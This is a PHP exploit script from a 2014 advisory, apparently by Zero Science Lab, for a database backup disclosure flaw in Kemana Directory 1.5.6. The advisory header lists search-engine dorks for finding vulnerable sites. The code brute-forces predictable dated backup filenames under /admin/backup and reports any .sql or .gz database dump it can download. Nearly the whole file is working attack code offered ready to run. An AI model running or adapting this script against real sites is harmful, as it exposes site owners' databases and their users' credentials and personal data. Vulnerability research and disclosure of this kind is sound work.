
/*

Kemana Directory 1.5.6 Database Backup Disclosure Exploit


Vendor: C97net
Product web page: http://www.c97.net
Affected version: 1.5.6

Summary: Experience the ultimate directory script solution
with Kemana. Create your own Yahoo or Dmoz easily with Kemana.
Unique Kemana&#039;s features including: CMS engine based on our
qEngine, multiple directories support, user friendly administration
control panel, easy to use custom fields, unsurpassed flexibility.

Desc: Kemana stores database backups using the Backup DB tool
as &#039;_Full Backup YYYYMMDD_1.sql&#039; or &#039;_Full Backup YYYYMMDD_1.gz&#039;,
which can be exploited to disclose sensitive information by
downloading the file. The &#039;/admin/backup&#039; is also vulnerable to
directory listing by default.


Tested on: Apache/2.4.7 (Win32)
           PHP/5.5.6
           MySQL 5.6.14


Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
                            @zeroscience


Advisory ID: ZSL-2014-5176
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5176.php


Dork #1: intitle:powered by c97.net
Dork #2: intitle:powered by qEngine
Dork #3: intitle:powered by Kemana.c97.net
Dork #4: intitle:powered by Cart2.c97.net



07.03.2014

*/


error_reporting(0);

function status($done, $total, $size=20)
{
  static $start_time;
   if($done > $total) return;
   if(empty($start_time)) $start_time=time();

  $now = time();
   $perc=(double)($done/$total);
   $bar=floor($perc*$size);

   $disp=number_format($perc*100, 0);
 
  $status_bar="\r $disp% [";
  $status_bar.=str_repeat("=", $bar);
  if($bar<$size)
  {
    $status_bar.=">";
    $status_bar.=str_repeat(" ", $size-$bar);
  } else
    {
      $status_bar.="=";
    }
   
   $status_bar.="] $done/$total";
 
  $rate = ($now-$start_time)/$done;
  $left = $total - $done;
  $eta = round($rate * $left, 2);
  $elapsed = $now - $start_time;
 
  $status_bar.= " remaining: ".number_format($eta)." sec. elapsed: ".number_format($elapsed)." sec.";
 
  echo "$status_bar ";
  flush();
 
  if($done == $total)
  {
    echo "\n";
  }
}

print "
 @---------------------------------------------------------------@
 |                                                               |
 |   Kemana Directory 1.5.6 Database Backup Disclosure Exploit   |
 |                                                               |
 |                                                               |
 |              Copyleft (c) 2014, Zero Science Lab              |
 |                                                               |
 |                   Advisory ID: ZSL-2014-5176                  |
 |                       www.zeroscience.mk                      |
 |                                                               |
 @---------------------------------------------------------------@
    ";

if ($argc < 4)
{
    print "\n\n [+] Usage: php $argv[0] <host> <port> <dirname>\n\n";
    print " [+] Example: php $argv[0] zeroscience.mk 80 hercules\n\n";
    die();
}

$godina_array = array(&#039;2014&#039;,&#039;2013&#039;,&#039;2012&#039;,&#039;2011&#039;,&#039;2010&#039;);

$mesec_array = array(&#039;12&#039;,&#039;11&#039;,&#039;10&#039;,&#039;09&#039;,
           &#039;08&#039;,&#039;07&#039;,&#039;06&#039;,&#039;05&#039;,
           &#039;04&#039;,&#039;03&#039;,&#039;02&#039;,&#039;01&#039;);

$dn_array = array(&#039;31&#039;,&#039;30&#039;,&#039;29&#039;,&#039;28&#039;,&#039;27&#039;,&#039;26&#039;,
          &#039;25&#039;,&#039;24&#039;,&#039;23&#039;,&#039;22&#039;,&#039;21&#039;,&#039;20&#039;,
            &#039;19&#039;,&#039;18&#039;,&#039;17&#039;,&#039;16&#039;,&#039;15&#039;,&#039;14&#039;,
          &#039;13&#039;,&#039;12&#039;,&#039;11&#039;,&#039;10&#039;,&#039;09&#039;,&#039;08&#039;,
            &#039;07&#039;,&#039;06&#039;,&#039;05&#039;,&#039;04&#039;,&#039;03&#039;,&#039;02&#039;,
            &#039;01&#039;);

$host = $argv[1];
$port = intval($argv[2]);
$path = $argv[3];
$dbnm = "Full%20Backup%20";

$alert1 = "\033[1;31m";
$alert2 = "\033[0;37m";
$alert3 = "\033[1;32m";

echo "\n [*] Running checks:\n\n";

foreach($godina_array as $godina)
{
  foreach($mesec_array as $mesec)
  {
    $x++;
    status($x, 58);
    foreach($dn_array as $dn)
    {
      $ext=".gz";
      if(file_get_contents("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext))
      {
        echo "\n";
        echo $alert1;
        print "\n\n\n !!! DATABASE BACKUP FILE FOUND !!!\n\n";
        echo $alert2;
        print " Filename: &#039;_Full Backup ".$godina.$mesec.$dn."_1".$ext."&#039;\n";
        print " Full URL:\x20";
        echo $alert3;
        die("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext."\n\n");
      }
      $ext=".sql";
      if(file_get_contents("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext))
      {
        echo "\n";
        echo $alert1;
        print "\n\n\n !!! DATABASE BACKUP FILE FOUND !!!\n\n";
        echo $alert2;
        print " Filename: &#039;_Full Backup ".$godina.$mesec.$dn."_1".$ext."&#039;\n";
        print " Full URL:\x20";
        echo $alert3;
        die("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext."\n\n");
      }
    }
  }
}

print "\n\n [*] Zero findings!\n\n\n";

?>

